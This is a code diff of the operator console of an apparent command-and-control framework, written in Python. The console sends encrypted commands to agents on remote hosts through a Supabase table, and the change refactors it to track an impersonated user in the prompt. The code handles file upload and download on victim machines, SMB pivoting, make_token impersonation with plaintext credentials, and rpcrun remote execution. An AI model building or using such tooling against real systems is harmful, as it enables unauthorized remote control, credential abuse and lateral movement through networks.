@@ -226,18 +226,20 @@ def background_check(command_id, agent_id, encryption_key, completed_event, prin
             completed_event.set()
             break
 
-def send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval):
+def send_command_and_get_output(hostname, logged_in_username, command_mappings, current_sleep_interval):
     linked_smb_ip = None
     smb_hostname = None
+    tokenized_username = None  # Track the tokenized username
 
     def get_prompt():
         if smb_hostname:
-            return f"{LIGHT_GREY}{username}{RESET} ({LIGHT_CYAN}{local_user}{RESET}@{GREEN}{hostname}{RESET}::{BLUE}{smb_hostname}{RESET} {RED}smb{RESET}) ~ "
+            return f"{LIGHT_GREY}{logged_in_username}{RESET} ({LIGHT_CYAN}{local_user}{RESET}@{GREEN}{hostname}{RESET}::{BLUE}{smb_hostname}{RESET} {RED}smb{RESET}) ~ "
         else:
-            return f"{LIGHT_GREY}{username}{RESET} ({LIGHT_CYAN}{local_user}{RESET}@{GREEN}{hostname}{RESET}::{BLUE}{external_ip}{RESET}) ~ "
+            token_part = f"::{tokenized_username}" if tokenized_username else ""
+            return f"{LIGHT_GREY}{logged_in_username}{RESET} ({LIGHT_CYAN}{local_user}{RESET}@{GREEN}{hostname}{RESET}::{BLUE}{external_ip}{RESET}{RED}{token_part}{RESET}) ~ "
 
     print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' or 'help' for options.")
-    print(f"Commands are being issued by user: {username}")
+    print(f"Commands are being issued by user: {logged_in_username}")
 
     local_user = get_local_user(hostname)
     if not local_user:
@@ -301,7 +303,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 if linked_smb_ip:
                     command_text = f"smb download {file_path}"
                 else:
-                    download_file(agent_id, hostname, file_path, username)  # Pass hostname here
+                    download_file(agent_id, hostname, file_path, logged_in_username)  # Pass hostname here
                 continue
             except ValueError:
                 print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
@@ -394,13 +396,14 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             if len(parts) < 3:
                 print(f"{RED}Error:{RESET} Invalid make_token command format. Use 'make_token <username> <password> [domain]'.")
                 continue
-            username = parts[1]
+            tokenized_username = parts[1]  # Update the tokenized username
             password = parts[2]
             domain = parts[3] if len(parts) == 4 else ''
-            command_text = f"make_token {username} {password} {domain}"
+            command_text = f"make_token {tokenized_username} {password} {domain}"
 
         elif command_text == "revert_to_self":
             command_text = "revert_to_self"
+            tokenized_username = None  # Clear the tokenized username
 
         elif command_text.startswith("cd"):
             parts = command_text.split(maxsplit=1)
@@ -473,9 +476,9 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             if len(parts) < 2:
                 print(f"{RED}Error:{RESET} Invalid get_user_info command format. Use 'get_user_info <username> [domain]'.")
                 continue
-            username = parts[1]
+            query_username = parts[1]
             domain = parts[2] if len(parts) > 2 else None
-            command_text = f"get_user_info {username} {domain if domain else ''}"
+            command_text = f"get_user_info {query_username} {domain if domain else ''}"
 
         elif command_text.startswith("getsmb"):
             parts = command_text.split()
@@ -544,10 +547,10 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             user = parts[3] if len(parts) > 3 else ''
             password = parts[4] if len(parts) > 4 else ''
             domain = parts[5] if len(parts) > 5 else ''
-            
+
             if domain:
                 user = f"{domain}\\{user}"
-            
+
             # Only include user and password if they are provided
             if user and password:
                 command_text = f"rpcrun {remote_hostname} {command} {user} {password}"
@@ -699,7 +702,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 if linked_smb_ip:
                     command_text = f"smb upload {local_path} {remote_path}"
                 else:
-                    upload_file(agent_id, hostname, local_path, remote_path, username)  # Pass hostname here
+                    upload_file(agent_id, hostname, local_path, remote_path, logged_in_username)  # Pass hostname here
                 continue
             except ValueError:
                 print(f"{RED}Error:{RESET} Invalid upload command format. Use 'upload <local_path> <remote_path>'.")
@@ -710,7 +713,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
         result = supabase.table('py2').insert({
             'agent_id': agent_id,
             'hostname': hostname,  # Include hostname in the command record
-            'username': username,
+            'username': logged_in_username,  # Ensure the username is passed correctly
             'command': encrypted_command_text,
             'status': 'Pending'
         }).execute()
